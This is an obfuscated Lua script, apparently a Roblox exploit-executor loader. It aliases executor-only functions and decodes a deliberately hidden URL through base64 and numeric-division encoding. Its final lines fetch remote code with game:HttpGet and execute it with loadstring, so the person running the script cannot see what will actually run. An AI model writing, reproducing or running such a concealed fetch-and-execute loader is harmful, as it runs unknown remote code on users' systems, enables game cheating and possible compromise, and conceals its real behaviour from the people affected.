--//this script was obfuscated by TFlIPFlOp V1.0.0 \--

local _3__________ = string.char
local _3___________ = warn
local _7____________ = getgenv
local _9_____________ = _G
local _2______________ = print
local _2_______________ = newcclosure
local _7________________ = getsenv
local _1_________________ = setrawmetatable
local _3__________________ = getfenv
local _9___________________ = true
local _6____________________ = bit
local _6_____________________ = setmetatable
local _6______________________ = next
local _8_______________________ = unpack
local _2________________________ = false
local _9_________________________ = tostring
local _3__________________________ = nil
local _6___________________________ = loadstring
local _8____________________________ = printidentity
local _3_____________________________ = pairs
local _6______________________________ = getrawmetatable
local _6_______________________________ = getrenv
local _4________________________________ = error
local _9_________________________________ = getmetatable
local _1__________________________________ = debug
characters = {
    "A",
    "B",
    "C",
    "D",
    "E",
    "F",
    "G",
    "H",
    "I",
    "J",
    "K",
    "L",
    "M",
    "N",
    "O",
    "P",
    "Q",
    "R",
    "S",
    "T",
    "U",
    "V",
    "W",
    "X",
    "Y",
    "Z",
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "`",
    "~",
    "!",
    "@",
    "#",
    "$",
    "%",
    "^",
    "&",
    "*",
    "(",
    ")",
    "-",
    "=",
    "_",
    "+",
    " ",
    "[",
    "{",
    "]",
    "}",
    "\\",
    "|",
    "'",
    '"',
    ";",
    ":",
    ",",
    "<",
    ".",
    ">",
    "/",
    "?",
    " ",
    "\n"
}
local _2______ = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
function _5____(data)
    data = string.gsub(data, "[^" .. _2______ .. "=]", "")
    return (data:gsub(
        ".",
        function(x)
            if (x == "=") then
                return ""
            end
            local r, f = "", (_2______:find(x) - 1)
            for i = 6, 1, -1 do
                r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and "1" or "0")
            end
            return r
        end
    ):gsub(
        "%d%d%d?%d?%d?%d?%d?%d?",
        function(x)
            if (#x ~= 8) then
                return ""
            end
            local c = 0
            for i = 1, 8 do
                c = c + (x:sub(i, i) == "1" and 2 ^ (8 - i) or 0)
            end
            return _3__________(c)
        end
    ))
end
function _6_____(str)
    local _6_______ = 7
    local _9________ = {}
    for num in string.gmatch(str, "([^/]+)") do
        table.insert(_9________, _5____(num))
    end
    local _6_________ = ""
    for p, m in _3_____________________________(_9________) do
        local a = tonumber(m / _6_______)
        for b in string.gmatch(_9_________________________(a), "[^%.]+") do
            if (b ~= "0") then
                _6_________ = _6_________ .. characters[tonumber(b)]
            end
        end
    end
    return _6_________
end
_6___________________________(
    game:HttpGet(
        (_6_____(
            "MjM4/MzIy/MzIy/Mjk0/MzE1/NjIz/NjU4/NjU4/MzA4/MTg5/MzQz/NjQ0/MjMx/MjQ1/MzIy/MjM4/MzI5/MTk2/MzI5/MzE1/MjE3/MzA4/MjAz/Mjg3/Mjgw/MzIy/MjE3/Mjgw/MzIy/NjQ0/MjAz/Mjg3/Mjcz/NjU4/MjAz/Mzg1/Mjgw/MzIy/MzY0/NjU4/MTU0/MjQ1/MzE1/MjQ1/Mjg3/Mjgw/MTY4/NjU4/Mjcz/MTg5/MjQ1/Mjgw/NjU4/MTQ=/MjQ1/MzIy/MjAz/Mjg3/MjQ1/Mjgw/OTE=/MjQ1/Mjgw/MjE3/MzA4/"
        )),
        _9___________________
    )
)()
